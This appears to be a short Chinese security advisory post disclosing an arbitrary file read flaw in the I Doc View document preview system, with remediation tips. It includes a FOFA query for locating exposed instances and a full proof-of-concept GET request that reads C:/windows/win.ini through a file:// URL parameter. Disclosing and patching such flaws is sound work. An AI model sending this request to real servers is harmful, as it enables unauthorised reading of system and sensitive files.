#  IDocView在线文档预览qJvqhFt.json任意文件读取漏洞   
原创 骇客安全  骇客安全   2025-02-14 14:09  
  
漏洞描述I Doc View 在线文档预览 qJvqhFt.json 任意文件读取漏洞，攻击者可利用此漏洞收集敏感信息，从而为下一步攻击做准备。漏洞复现1、fofatitle=="在线文档预览 - I Doc View"2、部分界面如下 3、隐患url，验证如下GET /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi HTTP/1.1Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: close修复建议1、请联系厂商进行修复。 2、如非必要，禁止公网访问该系统。 3、设置白名单访问。  
  
